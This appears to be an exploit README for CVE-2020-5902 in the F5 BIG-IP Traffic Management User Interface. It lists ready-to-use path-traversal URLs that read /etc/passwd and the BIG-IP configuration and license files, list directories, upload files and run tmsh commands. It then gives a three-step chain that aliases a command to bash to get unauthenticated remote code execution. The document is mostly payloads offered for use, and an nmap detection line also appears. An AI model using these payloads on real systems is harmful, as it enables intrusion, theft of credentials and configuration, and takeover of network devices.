OPEN README.md FOR BETTER READ :)

The Traffic Management User Interface (TMUI) present in F5 BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1 is vulnerable to a Remote Code Execution (RCE) vulnerability that allows unauthenticated attackers, or authenticated users, with network access to the TMUI, to execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code.



Also You can send /hsqldb; as GET request and it show you


</head><body><h1>HSQL Database Engine Servlet</h1>
The servlet is running.<p>
The database is also running.<p>
Database name: mem:.<p>
Queries processed: 0<p>


#Manual_Test

sudo nmap --script=http-vuln-cve2020-5902.nse -p PORT IP

https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts
https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
directoryList

List files within a folder specified through the directoryPath URL parameter

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp/

fileRead

Read a file content specified through the fileName URL parameter

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd

fileSave

Upload a file specified through the fileName URL parameter and content of the file specified through the content URL parameter, using POST method.

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&content=test

tmshCmd

Execute predefined (based on their documentation) system commands through the command URL parameter

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user

#You can achieve Remote Code Execution on the BIG-IP TMUI by chaining the fileSave and tmshCmd utility modules.

First, you need to send this payload in order to be able to execute bash commands:

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash (GET method)
Next, you’ll have to upload a file containing the command you want to execute on the system:

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/rce&content=whoami (POST method) - Here we uploaded the /tmp/rce file containing the whoami command.
Finally, you must list the file and you’ll see the output of the executed command reflected in the file content:

https://HOST/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/rce

(GET method)








